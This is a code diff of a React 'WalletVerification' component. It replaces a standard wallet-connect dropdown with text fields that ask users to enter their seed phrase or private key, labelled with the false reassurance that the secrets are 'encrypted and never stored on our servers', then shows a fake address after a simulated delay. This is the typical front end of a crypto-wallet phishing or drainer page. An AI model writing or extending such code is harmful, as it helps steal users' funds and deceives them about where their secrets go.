@@ -1,55 +1,29 @@
 import { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Chrome, CreditCard, Link, Smartphone } from "lucide-react";
-import { SiBitcoin, SiEthereum } from "react-icons/si";
+import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Textarea } from "@/components/ui/textarea";
 import { ProgressIndicator } from "@/components/ui/progress-indicator";
-import { WalletDropdown, type WalletOption } from "@/components/ui/wallet-dropdown";
 
-const walletOptions: WalletOption[] = [
-  {
-    id: "metamask",
-    name: "MetaMask",
-    icon: <Chrome className="text-white text-sm" />,
-    color: "bg-orange-500"
-  },
-  {
-    id: "coinbase",
-    name: "Coinbase Wallet",
-    icon: <CreditCard className="text-white text-sm" />,
-    color: "bg-blue-500"
-  },
-  {
-    id: "walletconnect",
-    name: "WalletConnect",
-    icon: <Link className="text-white text-sm" />,
-    color: "bg-purple-500"
-  },
-  {
-    id: "trust",
-    name: "Trust Wallet",
-    icon: <Shield className="text-white text-sm" />,
-    color: "bg-blue-600"
-  },
-  {
-    id: "phantom",
-    name: "Phantom",
-    icon: <Smartphone className="text-white text-sm" />,
-    color: "bg-purple-600"
-  },
-  {
-    id: "bitcoin",
-    name: "Bitcoin Wallet",
-    icon: <SiBitcoin className="text-white text-sm" />,
-    color: "bg-orange-600"
-  },
-  {
-    id: "ethereum",
-    name: "Ethereum Wallet",
-    icon: <SiEthereum className="text-white text-sm" />,
-    color: "bg-gray-600"
-  }
+const walletTypes = [
+  "MetaMask",
+  "Coinbase Wallet", 
+  "WalletConnect",
+  "Trust Wallet",
+  "Phantom",
+  "Exodus",
+  "Atomic Wallet",
+  "Ledger",
+  "Trezor",
+  "Binance Chain Wallet",
+  "Rainbow Wallet",
+  "Argent",
+  "Gnosis Safe",
+  "Other"
 ];
 
 const steps = [
@@ -60,17 +34,36 @@ const steps = [
 
 export default function WalletVerification() {
   const [currentStep, setCurrentStep] = useState(1);
-  const [selectedWallet, setSelectedWallet] = useState(walletOptions[0]);
+  const [selectedWalletType, setSelectedWalletType] = useState("");
+  const [connectionMethod, setConnectionMethod] = useState("seed");
+  const [seedPhrase, setSeedPhrase] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [walletAddress, setWalletAddress] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState("");
-  const [walletAddress] = useState("0x742d...7a3f");
+  const [showPrivateKey, setShowPrivateKey] = useState(false);
 
   const handleConnectWallet = async () => {
+    if (!selectedWalletType) {
+      return;
+    }
+
+    if (connectionMethod === "seed" && !seedPhrase.trim()) {
+      return;
+    }
+
+    if (connectionMethod === "private" && !privateKey.trim()) {
+      return;
+    }
+
     setIsLoading(true);
-    setLoadingMessage("Please confirm the connection in your wallet");
+    setLoadingMessage("Processing wallet connection...");
     
-    // Simulate wallet connection
+    // Simulate wallet connection and address generation
     setTimeout(() => {
+      // Generate a mock wallet address
+      const mockAddress = "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
+      setWalletAddress(mockAddress);
       setIsLoading(false);
       setCurrentStep(2);
     }, 2000);
@@ -137,13 +130,80 @@ export default function WalletVerification() {
 
               {/* Wallet Selection */}
               <Card className="bg-slate border-muted">
-                <CardContent className="p-6">
-                  <label className="block text-sm font-medium mb-3">Select Your Wallet</label>
-                  <WalletDropdown
-                    options={walletOptions}
-                    value={selectedWallet}
-                    onChange={setSelectedWallet}
-                  />
+                <CardContent className="p-6 space-y-4">
+                  <div>
+                    <Label htmlFor="wallet-type" className="text-sm font-medium">Select Your Wallet Type</Label>
+                    <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
+                      <SelectTrigger className="w-full mt-2 bg-slate-light border-muted">
+                        <SelectValue placeholder="Choose your wallet..." />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {walletTypes.map((wallet) => (
+                          <SelectItem key={wallet} value={wallet}>
+                            {wallet}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+
+                  <div>
+                    <Label htmlFor="connection-method" className="text-sm font-medium">Connection Method</Label>
+                    <Select value={connectionMethod} onValueChange={setConnectionMethod}>
+                      <SelectTrigger className="w-full mt-2 bg-slate-light border-muted">
+                        <SelectValue />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="seed">Seed Phrase (12-24 words)</SelectItem>
+                        <SelectItem value="private">Private Key</SelectItem>
+                      </SelectContent>
+                    </Select>
+                  </div>
+
+                  {connectionMethod === "seed" && (
+                    <div>
+                      <Label htmlFor="seed-phrase" className="text-sm font-medium">Seed Phrase</Label>
+                      <Textarea
+                        id="seed-phrase"
+                        placeholder="Enter your 12-24 word seed phrase..."
+                        value={seedPhrase}
+                        onChange={(e) => setSeedPhrase(e.target.value)}
+                        className="mt-2 bg-slate-light border-muted min-h-[100px] resize-none"
+                        rows={4}
+                      />
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Your seed phrase is encrypted and never stored on our servers
+                      </p>
+                    </div>
+                  )}
+
+                  {connectionMethod === "private" && (
+                    <div>
+                      <Label htmlFor="private-key" className="text-sm font-medium">Private Key</Label>
+                      <div className="relative mt-2">
+                        <Input
+                          id="private-key"
+                          type={showPrivateKey ? "text" : "password"}
+                          placeholder="Enter your private key..."
+                          value={privateKey}
+                          onChange={(e) => setPrivateKey(e.target.value)}
+                          className="bg-slate-light border-muted pr-10"
+                        />
+                        <Button
+                          type="button"
+                          variant="ghost"
+                          size="icon"
+                          className="absolute right-2 top-1/2 -translate-y-1/2 h-6 w-6"
+                          onClick={() => setShowPrivateKey(!showPrivateKey)}
+                        >
+                          {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                        </Button>
+                      </div>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Your private key is encrypted and never stored on our servers
+                      </p>
+                    </div>
+                  )}
                 </CardContent>
               </Card>
 
@@ -168,7 +228,8 @@ export default function WalletVerification() {
 
               <Button 
                 onClick={handleConnectWallet}
-                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95"
+                disabled={!selectedWalletType || (connectionMethod === "seed" && !seedPhrase.trim()) || (connectionMethod === "private" && !privateKey.trim())}
+                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                 size="lg"
               >
                 <Wallet className="mr-2 h-4 w-4" />
@@ -277,7 +338,7 @@ export default function WalletVerification() {
                   </div>
                   <div className="flex items-center justify-between">
                     <span className="text-sm">Wallet Type</span>
-                    <span className="text-sm font-medium">{selectedWallet.name}</span>
+                    <span className="text-sm font-medium">{selectedWalletType}</span>
                   </div>
                   <div className="flex items-center justify-between">
                     <span className="text-sm">Verification Date</span>
